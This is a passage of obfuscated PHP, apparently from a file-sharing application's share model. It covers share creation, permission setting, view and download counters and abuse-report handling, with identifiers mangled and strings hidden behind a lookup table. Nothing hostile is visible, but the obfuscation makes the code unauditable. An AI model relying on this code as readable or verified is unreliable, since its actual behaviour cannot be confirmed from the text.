$‰µşİé[1945]; $êĞ‰‹ß = Model($‰µşİé[596])->order($‰µşİé[401])->field($ÖÊùóã)->where($ô£€ò•Ú)->select(); if ($ø…ùÌµ[$‰µşİé[403]] == $‰µşİé[200]) { $ø…ùÌµ[$‰µşİé[97]] = IO::info($ø…ùÌµ[$‰µşİé[1159]]); } else { $ø…ùÌµ[$‰µşİé[97]] = Model($‰µşİé[1310])->pathInfo($ø…ùÌµ[$‰µşİé[403]]); } $ø…ùÌµ[$‰µşİé[1946]] = $êĞ‰‹ß; return $ø…ùÌµ; } protected function getInfoAuth($ï³‡òÓ) { $Š‚¢ø²Ï =& $_SERVER[¹àö™Ç¾]; $Ï­éÀß¹ = $this->getInfo($ï³‡òÓ); if ($Ï­éÀß¹[$Š‚¢ø²Ï[1640]] == USER_ID) { $Ï­éÀß¹[$Š‚¢ø²Ï[414]] = $Ï­éÀß¹[$Š‚¢ø²Ï[97]][$Š‚¢ø²Ï[414]]; } else { $Ï­éÀß¹[$Š‚¢ø²Ï[414]] = Model($Š‚¢ø²Ï[502])->authMake($Ï­éÀß¹[$Š‚¢ø²Ï[1946]]); } return $Ï­éÀß¹; } protected function listData($ˆ“©¤èÄ = null, $„²ñ‚æó = 300) { $³ù‘–ıÉ =& $_SERVER[¹àö™Ç¾]; $£ËìÇ² = array(array($³ù‘–ıÉ[493] => array($³ù‘–ıÉ[997], 0), $³ù‘–ıÉ[495] => array($³ù‘–ıÉ[997], 0), $³ù‘–ıÉ[1947] => $³ù‘–ıÉ[1903])); if ($ˆ“©¤èÄ == $³ù‘–ıÉ[1948]) { $£ËìÇ² = array($³ù‘–ıÉ[493] => 1); } else { if ($ˆ“©¤èÄ == $³ù‘–ıÉ[1144]) { $£ËìÇ² = array($³ù‘–ıÉ[495] => 1); } } $£ËìÇ²[$³ù‘–ıÉ[1640]] = USER_ID; $Ò ííÕ… = $this->where($£ËìÇ²)->selectPage($„²ñ‚æó); return $Ò ííÕ…; } protected function listToMe($–û‰¤ã’ = 300) { $Áğàìà¼ =& $_SERVER[¹àö™Ç¾]; $×º™ú¢ = Model($Áğàìà¼[1949])->userGroupParents(USER_ID); $ƒäğ”˜ı = array($Áğàìà¼[580] => SourceModel::TYPE_USER, $Áğàìà¼[504] => USER_ID); if ($×º™ú¢) { $ƒäğ”˜ı = array(array($Áğàìà¼[580] => SourceModel::TYPE_USER, $Áğàìà¼[504] => USER_ID), array($Áğàìà¼[580] => SourceModel::TYPE_GROUP, $Áğàìà¼[504] => array($Áğàìà¼[17], $×º™ú¢)), $Áğàìà¼[1947] => $Áğàìà¼[1903]); } $‚ÖÎ…Ò½ = Model($Áğàìà¼[596])->where($ƒäğ”˜ı)->selectPage($–û‰¤ã’); $¡ÌÀĞŠî = array_to_keyvalue_group($‚ÖÎ…Ò½[$Áğàìà¼[373]], $Áğàìà¼[488]); if (!$¡ÌÀĞŠî) { return $‚ÖÎ…Ò½; } $¨ßıî±Ö = $Áğàìà¼[1950]; $ƒäğ”˜ı = array($Áğàìà¼[488] => array($Áğàìà¼[419], array_keys($¡ÌÀĞŠî)), $Áğàìà¼[1640] => array($Áğàìà¼[999], $Áğàìà¼[200])); $ÊŒ½ºã = $this->field($¨ßıî±Ö)->where($ƒäğ”˜ı)->select(); foreach ($ÊŒ½ºã as $ÉÏ§¡´Á => &$À¿¡ñøş) { $À¿¡ñøş[$Áğàìà¼[1946]] = $¡ÌÀĞŠî[$À¿¡ñøş[$Áğàìà¼[488]]]; } unset($À¿¡ñøş); $±İ›şÅò = array($Áğàìà¼[1951] => $ÊŒ½ºã, $Áğàìà¼[1952] => $‚ÖÎ…Ò½[$Áğàìà¼[370]]); return $±İ›şÅò; } protected function shareAdd($±éÚØ†Ú, $ñÜµóÓ¥) { $ŒÀˆõô¢ =& $_SERVER[¹àö™Ç¾]; $šùùÇ‡ = $this->_addShareData($±éÚØ†Ú, $ñÜµóÓ¥); if (!empty($ñÜµóÓ¥[$ŒÀˆõô¢[1953]])) { $this->_shareAuthSet($šùùÇ‡, $ñÜµóÓ¥[$ŒÀˆõô¢[1953]]); } $this->shareEventAdd($±éÚØ†Ú, $ñÜµóÓ¥, $ŒÀˆõô¢[1147]); return $šùùÇ‡; } protected function shareAddSystem($ÌÉì¥œµ, $ş›öæ†¾) { $€«À¾ï =& $_SERVER[¹àö™Ç¾]; $°Ù¤Üñù = $this->_addShareData($ÌÉì¥œµ, $ş›öæ†¾, $€«À¾ï[1259]); $this->_shareAuthSet($°Ù¤Üñù, $ş›öæ†¾[$€«À¾ï[1953]]); return $°Ù¤Üñù; } private function shareEventAdd($Í™¼»ÓÚ, $÷”ã‡³æ, $êÊÃ—ø¤ = "\x61\x64\x64") { $”ïéÊ»˜ =& $_SERVER[¹àö™Ç¾]; if (!$Í™¼»ÓÚ || $Í™¼»ÓÚ == $”ïéÊ»˜[200]) { return; } if ($êÊÃ—ø¤ == $”ïéÊ»˜[1147]) { if ($÷”ã‡³æ[$”ïéÊ»˜[493]] == $”ïéÊ»˜[99]) { Model($”ïéÊ»˜[564])->eventShare($Í™¼»ÓÚ, $”ïéÊ»˜[1954]); } if ($÷”ã‡³æ[$”ïéÊ»˜[495]] == $”ïéÊ»˜[99]) { Model($”ïéÊ»˜[564])->eventShare($Í™¼»ÓÚ, $”ïéÊ»˜[1955]); } return; } $†¸Ä‰ÏÕ = $this->getInfoByPath($Í™¼»ÓÚ); $‘ƒöı°Ó = $”ïéÊ»˜[1956]; if ($†¸Ä‰ÏÕ[$”ïéÊ»˜[493]] == $”ïéÊ»˜[200] && $÷”ã‡³æ[$”ïéÊ»˜[493]] == $”ïéÊ»˜[99]) { $‘ƒöı°Ó = $”ïéÊ»˜[1954]; } if ($†¸Ä‰ÏÕ[$”ïéÊ»˜[493]] == $”ïéÊ»˜[99] && $÷”ã‡³æ[$”ïéÊ»˜[493]] == $”ïéÊ»˜[200]) { $‘ƒöı°Ó = $”ïéÊ»˜[1957]; } if ($†¸Ä‰ÏÕ[$”ïéÊ»˜[495]] == $”ïéÊ»˜[200] && $÷”ã‡³æ[$”ïéÊ»˜[495]] == $”ïéÊ»˜[99]) { $‘ƒöı°Ó = $”ïéÊ»˜[1955]; } if ($†¸Ä‰ÏÕ[$”ïéÊ»˜[495]] == $”ïéÊ»˜[99] && $÷”ã‡³æ[$”ïéÊ»˜[495]] == $”ïéÊ»˜[200]) { $‘ƒöı°Ó = $”ïéÊ»˜[1958]; } Model($”ïéÊ»˜[564])->eventShare($Í™¼»ÓÚ, $‘ƒöı°Ó); return; } private function _addShareData($©Ÿ·Û¡, $ô†û¶µÇ = array(), $ëÎãøµ = false) { $¶Õ°·Æ =& $_SERVER[¹àö™Ç¾]; $•ºÍ²– = $ëÎãøµ == $¶Õ°·Æ[1259] ? 0 : USER_ID; $Ôµ¯½’ç = array($¶Õ°·Æ[418] => $©Ÿ·Û¡, $¶Õ°·Æ[1631] => $•ºÍ²–); if ($©Ÿ·Û¡ == 0) { $Ôµ¯½’ç = array($¶Õ°·Æ[1959] => $ô†û¶µÇ[$¶Õ°·Æ[1159]], $¶Õ°·Æ[1631] => $•ºÍ²–); } if ($ĞÁ›‰¾€ = $this->where($Ôµ¯½’ç)->find()) { return $ĞÁ›‰¾€[$¶Õ°·Æ[488]]; } if ($©Ÿ·Û¡ == 0) { $ÎéÍÜáç = array($¶Õ°·Æ[42] => get_path_this($ô†û¶µÇ[$¶Õ°·Æ[88]])); } else { $ÎéÍÜáç = Model($¶Õ°·Æ[817])->sourceInfo($©Ÿ·Û¡); if (!$ÎéÍÜáç) { return !1; } } if (!$ô†û¶µÇ[$¶Õ°·Æ[1540]]) { $ô†û¶µÇ[$¶Õ°·Æ[1540]] = $ÎéÍÜáç[$¶Õ°·Æ[42]]; } $¸‘‹¤ì¢ = array($¶Õ°·Æ[1631] => $•ºÍ²–, $¶Õ°·Æ[418] => $©Ÿ·Û¡, $¶Õ°·Æ[1540] => $¶Õ°·Æ[22], $¶Õ°·Æ[493] => 0, $¶Õ°·Æ[495] => 0, $¶Õ°·Æ[1159] => $¶Õ°·Æ[22], $¶Õ°·Æ[311] => $¶Õ°·Æ[22], $¶Õ°·Æ[874] => $¶Õ°·Æ[22], $¶Õ°·Æ[1960] => 0, $¶Õ°·Æ[1961] => 0, $¶Õ°·Æ[496] => 0, $¶Õ°·Æ[497] => $¶Õ°·Æ[22], $¶Õ°·Æ[490] => $¶Õ°·Æ[22]); $©ÀñÁğ = explode($¶Õ°·Æ[60], $¶Õ°·Æ[1962]); foreach ($©ÀñÁğ as $ì§¥£€ª) { if (!isset($ô†û¶µÇ[$ì§¥£€ª])) { continue; } $¸‘‹¤ì¢[$ì§¥£€ª] = $ô†û¶µÇ[$ì§¥£€ª]; } $åù‰ş‹™ = $this->add($¸‘‹¤ì¢); $›ŞÚşü˜ = array($¶Õ°·Æ[490] => short_id($åù‰ş‹™)); $this->where(array($¶Õ°·Æ[487] => $åù‰ş‹™))->save($›ŞÚşü˜); return $åù‰ş‹™; } private function _shareAuthSet($úú¶™ø¸, $ÚÌäÜ) { $ÓÍ¡§‰ =& $_SERVER[¹àö™Ç¾]; if (!is_array($ÚÌäÜ)) { return !1; } $êçÛ¶Ş = Model($ÓÍ¡§‰[1913]); $êçÛ¶Ş->where(array($ÓÍ¡§‰[488] => $úú¶™ø¸))->delete(); $†ÍÈñ¬ = array(); foreach ($ÚÌäÜ as $ÙÆŞÛ™›) { $´ùá£Í‘ = SourceModel::TYPE_USER; if ($ÙÆŞÛ™›[$ÓÍ¡§‰[412]] == SourceModel::TYPE_GROUP) { $´ùá£Í‘ = SourceModel::TYPE_GROUP; } $ñÑÂí©ã = array($ÓÍ¡§‰[488] => $úú¶™ø¸, $ÓÍ¡§‰[412] => $´ùá£Í‘, $ÓÍ¡§‰[504] => intval($ÙÆŞÛ™›[$ÓÍ¡§‰[504]]), $ÓÍ¡§‰[1909] => 0, $ÓÍ¡§‰[1963] => -1); if ($ÙÆŞÛ™›[$ÓÍ¡§‰[1909]]) { $ñÑÂí©ã[$ÓÍ¡§‰[1909]] = $ÙÆŞÛ™›[$ÓÍ¡§‰[1909]]; } else { if ($ÙÆŞÛ™›[$ÓÍ¡§‰[1963]]) { $ñÑÂí©ã[$ÓÍ¡§‰[1963]] = $ÙÆŞÛ™›[$ÓÍ¡§‰[1963]]; } } $†ÍÈñ¬[] = $ñÑÂí©ã; } return $êçÛ¶Ş->addAll($†ÍÈñ¬, array(), !0); } public function numViewAdd($û°ÅÂ®«) { $æè°ˆÃ =& $_SERVER[¹àö™Ç¾]; $Úæ³­ì = array($æè°ˆÃ[487] => $û°ÅÂ®«); $this->where($Úæ³­ì)->setAdd($æè°ˆÃ[1960]); } public function numDownloadAdd($Ëêš ™ç) { $®Ù¢Ò«Û =& $_SERVER[¹àö™Ç¾]; $­ø×½Œ = array($®Ù¢Ò«Û[487] => $Ëêš ™ç); $this->where($­ø×½Œ)->setAdd($®Ù¢Ò«Û[1961]); } protected function shareEdit($”ç„ÊØØ, $ô¢ï×Š) { $İ²ÄÓ® =& $_SERVER[¹àö™Ç¾]; $Ğú¶ºı° = $this->getInfo($”ç„ÊØØ); if (!$Ğú¶ºı°) { return !1; } $this->_checkLinkShare($ô¢ï×Š, $Ğú¶ºı°); $É¼Ú¸ƒ­ = array(); $Åùğ¸‰¤ = explode($İ²ÄÓ®[60], $İ²ÄÓ®[1964]); foreach ($Åùğ¸‰¤ as $ğƒ…½æ ) { if (!array_key_exists($ğƒ…½æ , $ô¢ï×Š)) { continue; } $É¼Ú¸ƒ­[$ğƒ…½æ ] = $ô¢ï×Š[$ğƒ…½æ ]; } $this->shareEventAdd($Ğú¶ºı°[$İ²ÄÓ®[403]], $ô¢ï×Š, $İ²ÄÓ®[1778]); $this->where(array($İ²ÄÓ®[487] => $”ç„ÊØØ))->save($É¼Ú¸ƒ­); if (isset($ô¢ï×Š[$İ²ÄÓ®[1953]])) { $this->_shareAuthSet($”ç„ÊØØ, $ô¢ï×Š[$İ²ÄÓ®[1953]]); } return !0; } private function _checkLinkShare($™¬¹¶¼Ù, $·ç‡Èé) { $Ã±èå² =& $_SERVER[¹àö™Ç¾]; if ($™¬¹¶¼Ù[$Ã±èå²[493]] != $Ã±èå²[99]) { return; } $’•²òÙà = $·ç‡Èé[$Ã±èå²[97]][$Ã±èå²[403]]; if ($·ç‡Èé[$Ã±èå²[97]][$Ã±èå²[43]] != $Ã±èå²[202]) { $†Ñ¹ˆ¶ş = $this->_folderReport($’•²òÙà); if (!$†Ñ¹ˆ¶ş) { return; } show_json(LNG($Ã±èå²[1965]) . $Ã±èå²[1966] . $†Ñ¹ˆ¶ş, !1); } $‡Ù…è¬¤ = Model($Ã±èå²[817])->fileInfoGet($·ç‡Èé[$Ã±èå²[97]][$Ã±èå²[403]]); if (!$‡Ù…è¬¤) { return; } $¾ËÓÎÕ = $this->shareFileMeta($‡Ù…è¬¤[$Ã±èå²[467]]); if (isset($¾ËÓÎÕ[$Ã±èå²[378]]) && $¾ËÓÎÕ[$Ã±èå²[378]] == $Ã±èå²[99]) { show_json(LNG($Ã±èå²[1967]), !1); } } private function _folderReport($şò¼¼™°) { $ò²°—œÇ =& $_SERVER[¹àö™Ç¾]; $‡ˆ§Â¨¦ = array($ò²°—œÇ[467] => array($ò²°—œÇ[997], 0), $ò²°—œÇ[742] => 3); $Š©ÓŠÛ¬ = Model($ò²°—œÇ[1968])->where($‡ˆ§Â¨¦)->field($ò²°—œÇ[467])->select(); if (!$Š©ÓŠÛ¬) { return !1; } $Š©ÓŠÛ¬ = array_to_keyvalue($Š©ÓŠÛ¬, $ò²°—œÇ[22], $ò²°—œÇ[467]); $¶ÃªÑØã = $ò²°—œÇ[60] . $şò¼¼™° . $ò²°—œÇ[60]; $‡ˆ§Â¨¦ = array($ò²°—œÇ[467] => array($ò²°—œÇ[17], $Š©ÓŠÛ¬), $ò²°—œÇ[521] => array($ò²°—œÇ[387], "\x25{$¶ÃªÑØã}\45"), $ò²°—œÇ[431] => 0); $Ú³ã÷Ô‘ = Model($ò²°—œÇ[817])->where($‡ˆ§Â¨¦)->field($ò²°—œÇ[1969])->find(); if (!$Ú³ã÷Ô‘) { return !1; } $€øË’µ– = substr($Ú³ã÷Ô‘[$ò²°—œÇ[521]], strpos($Ú³ã÷Ô‘[$ò²°—œÇ[521]], $¶ÃªÑØã)); $‡ˆ§Â¨¦ = array($ò²°—œÇ[403] => array($ò²°—œÇ[17], trim($€øË’µ–, $ò²°—œÇ[60]))); $æöëû¨  = Model($ò²°—œÇ[817])->where($‡ˆ§Â¨¦)->field($ò²°—œÇ[42])->select(); $¥Í¯äÉï = array_to_keyvalue($æöëû¨ , $ò²°—œÇ[22], $ò²°—œÇ[42]); $¥Í¯äÉï[] = $Ú³ã÷Ô‘[$ò²°—œÇ[42]]; return implode($ò²°—œÇ[18], $¥Í¯äÉï); } protected function remove($İ—İÖŸ) { $ÕÍù™ñá =& $_SERVER[¹àö™Ç¾]; if (is_array($İ—İÖŸ)) { $İ—İÖŸ = array($ÕÍù™ñá[17], $İ—İÖŸ); } $­ó½µƒ– = array($ÕÍù™ñá[488] => $İ—İÖŸ); $­ˆÀôÌœ = $this->where($­ó½µƒ–)->delete(); if ($­ˆÀôÌœ) { Model($ÕÍù™ñá[596])->where(array($ÕÍù™ñá[488] => $İ—İÖŸ))->delete(); } $„§ô’¼Æ = is_array($İ—İÖŸ) ? $İ—İÖŸ[1] : array($İ—İÖŸ); for ($§š…©úê = 0; $§š…©úê < count($„§ô’¼Æ); $§š…©úê++) { $Ü¢Æû¯‹ = $this->getInfo($„§ô’¼Æ[$§š…©úê]); if ($Ü¢Æû¯‹[$ÕÍù™ñá[495]] == $ÕÍù™ñá[99]) { Model($ÕÍù™ñá[564])->eventShare($Ü¢Æû¯‹[$ÕÍù™ñá[403]], $ÕÍù™ñá[1958]); } if ($Ü¢Æû¯‹[$ÕÍù™ñá[493]] == $ÕÍù™ñá[99]) { Model($ÕÍù™ñá[564])->eventShare($Ü¢Æû¯‹[$ÕÍù™ñá[403]], $ÕÍù™ñá[1957]); } } return $­ˆÀôÌœ; } protected function removeBySource($Ÿ›Á„á) { $¢Ó¹Ø±Í =& $_SERVER[¹àö™Ç¾]; $©È‰ªª¶ = array($¢Ó¹Ø±Í[418] => array($¢Ó¹Ø±Í[419], $Ÿ›Á„á)); $›áÉ÷™Ş = $this->field($¢Ó¹Ø±Í[488])->where($©È‰ªª¶)->select(); $›áÉ÷™Ş = array_to_keyvalue($›áÉ÷™Ş, $¢Ó¹Ø±Í[22], $¢Ó¹Ø±Í[488]); if (!$›áÉ÷™Ş) { return; } $©È‰ªª¶ = array($¢Ó¹Ø±Í[487] => array($¢Ó¹Ø±Í[419], $›áÉ÷™Ş)); $this->where($©È‰ªª¶)->delete(); Model($¢Ó¹Ø±Í[596])->where($©È‰ªª¶)->delete(); } public function listAll($ñ‡à¿ò›) { $‡ÙÇûàú =& $_SERVER[¹àö™Ç¾]; $œ—¯„±ó = array(); if ($ñ‡à¿ò›[$‡ÙÇûàú[1640]]) { $œ—¯„±ó[$‡ÙÇûàú[1640]] = $ñ‡à¿ò›[$‡ÙÇûàú[1640]]; } if ($ñ‡à¿ò›[$‡ÙÇûàú[753]]) { $ŞÜ¬•ÕÖ = $ñ‡à¿ò›[$‡ÙÇûàú[496]] ? $ñ‡à¿ò›[$‡ÙÇûàú[496]] : strtotime(date($‡ÙÇûàú[1970])); $œ—¯„±ó[$‡ÙÇûàú[203]] = array($‡ÙÇûàú[337], array($ñ‡à¿ò›[$‡ÙÇûàú[753]], $ŞÜ¬•ÕÖ)); } if ($ñ‡à¿ò›[$‡ÙÇûàú[43]]) { $œ—¯„±ó[$ñ‡à¿ò›[$‡ÙÇûàú[43]]] = 1; } else { $œ—¯„±ó[] = array($‡ÙÇûàú[493] => array($‡ÙÇûàú[997], 0), $‡ÙÇûàú[495] => array($‡ÙÇûàú[997], 0), $‡ÙÇûàú[1947] => $‡ÙÇûàú[1903]); } if ($ñ‡à¿ò›[$‡ÙÇûàú[1899]]) { $œ—¯„±ó[] = array($‡ÙÇûàú[490] => $ñ‡à¿ò›[$‡ÙÇûàú[1899]], $‡ÙÇûàú[1540] => array($‡ÙÇûàú[387], "\45{$ñ‡à¿ò›[$‡ÙÇûàú[1899]]}\45"), $‡ÙÇûàú[1947] => $‡ÙÇûàú[1903]); } $±§ç£—Â = $this->_makeOrder()->where($œ—¯„±ó)->selectPage(20); if (empty($±§ç£—Â[$‡ÙÇûàú[373]])) { return array(); } $this->_listDataApply($±§ç£—Â[$‡ÙÇûàú[373]]); return $±§ç£—Â; } public function listDataApply($áÌØÖ) { $this->_listDataApply($áÌØÖ); return $áÌØÖ; } private function _listDataApply(&$óò¨¡Éé) { $ü©ÕÃóÂ =& $_SERVER[¹àö™Ç¾]; $‚Š¿Ùà = array_to_keyvalue($óò¨¡Éé, $ü©ÕÃóÂ[22], $ü©ÕÃóÂ[1640]); $ÙÆöµ‹• = Model($ü©ÕÃóÂ[538])->userListInfo(array_unique($‚Š¿Ùà)); $©‘ÌùËª = array_to_keyvalue($óò¨¡Éé, $ü©ÕÃóÂ[22], $ü©ÕÃóÂ[403]); $®¼è¯² = Model($ü©ÕÃóÂ[817])->sourceListInfo($©‘ÌùËª, !0); foreach ($óò¨¡Éé as $æÚ‰ù­ => &$â™ûëšÅ) { $ò‘ˆ = $â™ûëšÅ[$ü©ÕÃóÂ[1640]]; $â™ûëšÅ[$ü©ÕÃóÂ[1971]] = $ÙÆöµ‹•[$ò‘ˆ] ? $ÙÆöµ‹•[$ò‘ˆ] : !1; $¡Ãáˆ•¥ = $â™ûëšÅ[$ü©ÕÃóÂ[403]]; $â™ûëšÅ[$ü©ÕÃóÂ[97]] = $®¼è¯²[$¡Ãáˆ•¥] ? $®¼è¯²[$¡Ãáˆ•¥] : !1; if ($â™ûëšÅ[$ü©ÕÃóÂ[97]][$ü©ÕÃóÂ[431]] == $ü©ÕÃóÂ[99]) { unset($óò¨¡Éé[$æÚ‰ù­]); } if ($â™ûëšÅ[$ü©ÕÃóÂ[97]] != $ü©ÕÃóÂ[200] && !$â™ûëšÅ[$ü©ÕÃóÂ[97]]) { unset($óò¨¡Éé[$æÚ‰ù­]); } } unset($â™ûëšÅ); $óò¨¡Éé = array_values($óò¨¡Éé); } private function _makeOrder($¢ÇÜ‘ = '') { $€ª„Ğû =& $_SERVER[¹àö™Ç¾]; $Ôöôç–¤ = array($€ª„Ğû[203], $€ª„Ğû[496], $€ª„Ğû[1960], $€ª„Ğû[1961]); $ôêç…ô = array($€ª„Ğû[448] => $€ª„Ğû[449], $€ª„Ğû[450] => $€ª„Ğû[451]); $³·¸™« = Input::get($€ª„Ğû[455], $€ª„Ğû[17], $€ª„Ğû[424], $Ôöôç–¤); $çşÈúÁ¡ = Input::get($€ª„Ğû[456], $€ª„Ğû[17], $€ª„Ğû[1972], array($€ª„Ğû[1898], $€ª„Ğû[450])); $çşÈúÁ¡ = $ôêç…ô[$çşÈúÁ¡]; $¢ÇÜ‘ = $¢ÇÜ‘ . "{$³·¸™«}\40{$çşÈúÁ¡}"; return $this->order($¢ÇÜ‘); } public function reportAdd($‹·õ‡‰Ÿ) { $û¤ôËØ =& $_SERVER[¹àö™Ç¾]; $ĞÈ»éÊê = array($û¤ôËØ[488] => $‹·õ‡‰Ÿ[$û¤ôËØ[488]], $û¤ôËØ[1640] => USER_ID); if (Model($û¤ôËØ[1968])->where($ĞÈ»éÊê)->find()) { return !1; } $±Í©İ‰’ = array($û¤ôËØ[488] => $‹·õ‡‰Ÿ[$û¤ôËØ[488]], $û¤ôËØ[1540] => $‹·õ‡‰Ÿ[$û¤ôËØ[1540]], $û¤ôËØ[403] => $‹·õ‡‰Ÿ[$û¤ôËØ[403]], $û¤ôËØ[467] => $‹·õ‡‰Ÿ[$û¤ôËØ[467]], $û¤ôËØ[1640] => USER_ID, $û¤ôËØ[43] => $‹·õ‡‰Ÿ[$û¤ôËØ[43]], $û¤ôËØ[451] => $‹·õ‡‰Ÿ[$û¤ôËØ[451]]); return Model($û¤ôËØ[1968])->add($±Í©İ‰’); } public function reportList($½ëÂıãÆ) { $’–ìÚˆæ =& $_SERVER[¹àö™Ç¾]; $Ï•œşü© = array(); if ($½ëÂıãÆ[$’–ìÚˆæ[753]]) { $Ğ´Ñ¾ = $½ëÂıãÆ[$’–ìÚˆæ[496]] ? $½ëÂıãÆ[$’–ìÚˆæ[496]] : strtotime(date($’–ìÚˆæ[1970])); $Ï•œşü©[$’–ìÚˆæ[203]] = array($’–ìÚˆæ[337], array($½ëÂıãÆ[$’–ìÚˆæ[753]], $Ğ´Ñ¾)); } if (isset($½ëÂıãÆ[$’–ìÚˆæ[43]]) && in_array($½ëÂıãÆ[$’–ìÚˆæ[43]], array($’–ìÚˆæ[99], $’–ìÚˆæ[435], $’–ìÚˆæ[1973], $’–ìÚˆæ[1974], $’–ìÚˆæ[1975]))) { $Ï•œşü©[$’–ìÚˆæ[43]] = $½ëÂıãÆ[$’–ìÚˆæ[43]]; } if (isset($½ëÂıãÆ[$’–ìÚˆæ[742]]) && in_array($½ëÂıãÆ[$’–ìÚˆæ[742]], array($’–ìÚˆæ[200], $’–ìÚˆæ[99], $’–ìÚˆæ[435], $’–ìÚˆæ[1973]))) { $Ï•œşü©[$’–ìÚˆæ[742]] = $½ëÂıãÆ[$’–ìÚˆæ[742]]; } $¶Ş‰Èî½ = Input::get($’–ìÚˆæ[456], $’–ìÚˆæ[17], $’–ìÚˆæ[1972], array($’–ìÚˆæ[1898], $’–ìÚˆæ[450])); $™€üöï  = array($’–ìÚˆæ[448] => $’–ìÚˆæ[449], $’–ìÚˆæ[450] => $’–ìÚˆæ[451]); $¦»åã¿ = $’–ìÚˆæ[1976] . $™€üöï [$¶Ş‰Èî½]; $½‡ø¿óˆ = Model($’–ìÚˆæ[1968])->where($Ï•œşü©)->order($¦»åã¿)->selectPage(20); if (empty($½‡ø¿óˆ[$’–ìÚˆæ[373]])) { return array(); } $å·‰Ğ¦ = array_to_keyvalue_group($½‡ø¿óˆ[$’–ìÚˆæ[373]], $’–ìÚˆæ[742], $’–ìÚˆæ[488]); if (!empty($å·‰Ğ¦[0])) { $½ëÂıãÆ = $å·‰Ğ¦[0]; $Ï•œşü© = array($’–ìÚˆæ[488] => array($’–ìÚˆæ[17], $½ëÂıãÆ)); $Ò®à»¸ = $this->where($Ï•œşü©)->field($’–ìÚˆæ[488])->select(); $Ò®à»¸ = array_to_keyvalue($Ò®à»¸, $’–ìÚˆæ[22], $’–ìÚˆæ[488]); $Ö®Œ¹ü¶ = array_diff($½ëÂıãÆ, $Ò®à»¸); if (!empty($Ö®Œ¹ü¶)) { foreach ($½‡ø¿óˆ[$’–ìÚˆæ[373]] as $‰²î¦‡Ğ => $˜áòîÈ£) { if (in_array($˜áòîÈ£[$’–ìÚˆæ[488]], $Ö®Œ¹ü¶)) { unset($½‡ø¿óˆ[$’–ìÚˆæ[373]][$‰²î¦‡Ğ]); } } } } $this->_listDataApply($½‡ø¿óˆ[$’–ìÚˆæ[373]]); return $½‡ø¿óˆ; } public function reportStatus($«¨®ÏÚ®) { $Ô˜öÃëÛ =& $_SERVER[¹àö™Ç¾]; $³È–À‡í = array($Ô˜öÃëÛ[401] => $«¨®ÏÚ®[$Ô˜öÃëÛ[401]]); $£¼èŞÎì = Model($Ô˜öÃëÛ[1968])->where($³È–À‡í)->field($Ô˜öÃëÛ[1977])->find(); if (!$£¼èŞÎì) { return !1; } $ ¦²©Š = array($Ô˜öÃëÛ[742] => $«¨®ÏÚ®[$Ô˜öÃëÛ[742]]); if ($«¨®ÏÚ®[$Ô˜öÃëÛ[742]] == $Ô˜öÃëÛ[1973] && $£¼èŞÎì[$Ô˜öÃëÛ[742]] == $Ô˜öÃëÛ[1973]) { $ ¦²©Š[$Ô˜öÃëÛ[742]] = 0; } $·ß’×è  = Model($Ô˜öÃëÛ[1968])->where($³È–À‡í)->save($ ¦²©Š); if ($«¨®ÏÚ®[$Ô˜öÃëÛ[742]] == $Ô˜öÃëÛ[435]) { if ($£¼èŞÎì[$Ô˜öÃëÛ[467]] != $Ô˜öÃëÛ[200] && $this->shareFileMeta($£¼èŞÎì[$Ô˜öÃëÛ[467]])) { $this->shareFileMeta($£¼èŞÎì[$Ô˜öÃëÛ[467]], 0); } $this->remove($£¼èŞÎì[$Ô˜öÃëÛ[488]]); return !0; } if ($·ß’×è  && $«¨®ÏÚ®[$Ô˜öÃëÛ[742]] == $Ô˜öÃëÛ[1973]) { $Ùá“Ê¯ä = $ ¦²©Š[$Ô˜öÃëÛ[742]] == $Ô˜öÃëÛ[1973] ? 1 : 0; $this->shareFileMeta($£¼èŞÎì[$Ô˜öÃëÛ[467]], $Ùá“Ê¯ä); $this->removeByFile($£¼èŞÎì[$Ô˜öÃëÛ[467]]); } return $·ß’×è ; } private function removeByFile($…œˆØ•“) { $êë§î =& $_SERVER[¹àö™Ç¾]; $ÄªŞ®¿¹ = Model($êë§î[817])->where(array($êë§î[467] => $…œˆØ•“))->field($êë§î[403])->select(); $ãÑê¢—Ä = array_to_keyvalue($ÄªŞ®¿¹, $êë§î[22], $êë§î[403]); $ËËŒ‡»ˆ = array($êë§î[403] => array($êë§î[17], $ãÑê¢—Ä), $êë§î[493] => 1); $ÄªŞ®¿¹ = $this->where($ËËŒ‡»ˆ)->field($êë§î[488])->select(); if (empty($ÄªŞ®¿¹)) { return; } $·£áõ¯· = array_to_keyvalue($ÄªŞ®¿¹, $êë§î[22], $êë§î[488]); $this->remove($·£áõ¯·); } private function shareFileMeta($ÑœÏì”, $†ÀŞØŠå = null) { $ØÂ±ÜÆ¿ =& $_SERVER[¹àö™Ç¾]; $éÆºË¥  = array($ØÂ±ÜÆ¿[467] => $ÑœÏì”, $ØÂ±ÜÆ¿[105] => $ØÂ±ÜÆ¿[1978]); if (is_null($†ÀŞØŠå)) { return Model($ØÂ±ÜÆ¿[1979])->where($éÆºË¥ )->find(); } $éÆºË¥ [$ØÂ±ÜÆ¿[378]] = $†ÀŞØŠå; Model($ØÂ±ÜÆ¿[1979])->add($éÆºË¥ , array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\145\x5f\x61\165\x74\x68"; public function getAuth($ıøÊéÒ) { $ğ‡İãÚ» =& $_SERVER[¹àö™Ç¾]; $ØÑà·Ü = $this->sourceAuthSelect($ıøÊéÒ); $ğ …÷­ = array(); $¼«ì»ÍÍ = array(); $Ó—ƒÆÀ = 2 << 25; foreach ($ØÑà·Ü as $ß¥µçˆû) { $¡Ÿ‘Á…ı = Model($ğ‡İãÚ»[507])->listData($ß¥µçˆû[$ğ‡İãÚ»[1909]]); if (!$¡Ÿ‘Á…ı) { continue; } $ğ …÷­[] = $ß¥µçˆû; $‡¯ëó = 0; if ($ß¥µçˆû[$ğ‡İãÚ»[412]] == SourceModel::TYPE_GROUP) { $‡¯ëó = $Ó—ƒÆÀ * 2; } if ($ß¥µçˆû[$ğ‡İãÚ»[412]] == SourceModel::TYPE_USER) { $‡¯ëó = $Ó—ƒÆÀ; } if ($ß¥µçˆû[$ğ‡İãÚ»[412]] == SourceModel::TYPE_USER && $ß¥µçˆû[$ğ‡İãÚ»[504]] == $ğ‡İãÚ»[200]) { $‡¯ëó = 0; } $¼«ì»ÍÍ[] = $¡Ÿ‘Á…ı[$ğ‡İãÚ»[414]] + $‡¯ëó; } array_multisort($¼«ì»ÍÍ, SORT_DESC, $ğ …÷­); return $ğ …÷­; } public function sourceAuthSelect($Å¦ éµ«) { $’Ñó½»Ä =& $_SERVER[¹àö™Ç¾]; static 